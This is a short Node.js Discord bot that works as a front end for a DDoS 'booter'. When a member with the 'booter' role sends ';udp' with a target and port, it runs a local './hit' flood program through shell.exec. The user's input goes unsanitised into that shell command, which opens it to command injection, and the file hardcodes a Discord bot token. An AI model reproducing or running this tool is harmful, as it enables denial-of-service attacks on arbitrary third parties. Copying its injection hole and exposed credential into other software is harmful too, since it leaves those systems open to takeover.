const Discord = require('discord.js');
const client = new Discord.Client();
const shell = require('shelljs')

client.on('message', message => {
  if (message.author.bot) return;
  if (message.content.indexOf(';') !== 0) return;
  const args = message.content.slice(1).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command==='udp'){
  	if (message.member.roles.some(role => role.name === 'booter')) {
      console.log(`attack! ${args[0]}`);
  	 //message.channel.send(`Attack started on port ${args[1]}.`);
  	    shell.exec(`./hit ${args[0]} ${parseInt(args[1])}`);
  	   // message.reply("Attack finished.");
     }
  }
});
client.login('NjA2OTAyNDU0MzY1NDU0MzM2.XURz-g.3yKRoycxyTmlhmuC6v7TgloKiXk');
